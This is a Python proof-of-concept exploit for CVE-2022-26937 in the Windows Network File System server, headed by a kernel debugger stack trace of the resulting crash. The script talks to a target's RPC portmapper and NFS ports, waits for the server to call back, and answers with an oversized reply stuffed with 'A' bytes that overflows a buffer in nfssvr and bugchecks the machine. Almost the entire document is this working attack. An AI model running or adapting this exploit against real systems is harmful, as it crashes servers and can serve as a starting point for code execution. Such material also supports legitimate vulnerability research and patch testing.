#Windows Network File System Crash PoC
#CVE-2022-26937
#@w3bd3vil
"""
1: kd> k
 # Child-SP          RetAddr               Call Site
00 ffffd000`d589ae58 fffff803`8997aae9     nt!KeBugCheckEx
01 ffffd000`d589ae60 fffff803`8997ae10     nt!KiBugCheckDispatch+0x69
02 ffffd000`d589afa0 fffff803`8997a034     nt!KiFastFailDispatch+0xd0
03 ffffd000`d589b180 fffff801`58eeeb05     nt!KiRaiseSecurityCheckFailure+0xf4
04 ffffd000`d589b318 fffff801`58ec8282     nfssvr!_report_gsfailure+0x5
05 ffffd000`d589b320 41414141`41414141     nfssvr!NlmGetClientAddressAndConnection+0xd7e
06 ffffd000`d589b4b0 41414141`41414141     0x41414141`41414141
07 ffffd000`d589b4b8 41414141`41414141     0x41414141`41414141
08 ffffd000`d589b4c0 41414141`41414141     0x41414141`41414141
09 ffffd000`d589b4c8 41414141`41414141     0x41414141`41414141
0a ffffd000`d589b4d0 41414141`41414141     0x41414141`41414141
[snip]
"""

import socket
import sys
import binascii
import time

TARGET_IP = "fe80::69e9:9937:aace:cf0c"
PORT = 111
HOST = ''

GET_PORT = [
            0x80, 0x00, 0x00, 0x38, 0x62, 0x7b, 0xde, 0xc9, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 
            0x00, 0x01, 0x86, 0xa0, 0x00, 0x00, 0x00, 0x02, 
            0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x86, 0xb5, 
            0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x06, 
            0x00, 0x00, 0x00, 0x00 
            ]

print("Target IP: %s" % TARGET_IP)
print("Target port: %s" % PORT)

sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
sock.connect((TARGET_IP, PORT))
sock.send(bytes(GET_PORT))
print("[+] Sending GetPort Request")
data = sock.recv(1024)
print(binascii.hexlify(data))


TEST_MSG = [
            0x80, 0x00, 0x01, 0xbc, 0x62, 0x7b, 0xde, 0xc9, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 
            0x00, 0x01, 0x86, 0xb5, 0x00, 0x00, 0x00, 0x03, 
            0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x20, 0x02, 0x02, 0x02, 0x02, 
            0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 
            0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 
            0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 
            0x02, 0x02, 0x02, 0x02, 0x00, 0x00, 0x00, 0x20, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            ]


sock1 = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
sock1.connect((TARGET_IP, 2049))
sock1.send(bytes(TEST_MSG))
print("[+] Sent TestMSG for Async Call")

soc = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
  
try:
    soc.bind((HOST, PORT))
     
except socket.error as message:
    print('Bind failed. Error Code : '+ str(message[0]) + ' Message '+ message[1])
    sys.exit()
     
print('Socket binding operation completed')
soc.listen(9)
conn, address = soc.accept()
print('Recieved Connection from ' + address[0] + ':' + str(address[1]))

data = conn.recv(1024)
XID = binascii.hexlify(data)

GETADDR_REPLY = [
                    0x80, 0x00, 0x08, 0x1c, 0x00, 0x00, 0x00, int(XID[14:16], base=16), 
                    0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41
                    ]
                    
GETADDR_REPLY_CONT = [
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41
                        ]

conn.send(bytes(GETADDR_REPLY))
conn.send(bytes(GETADDR_REPLY_CONT))
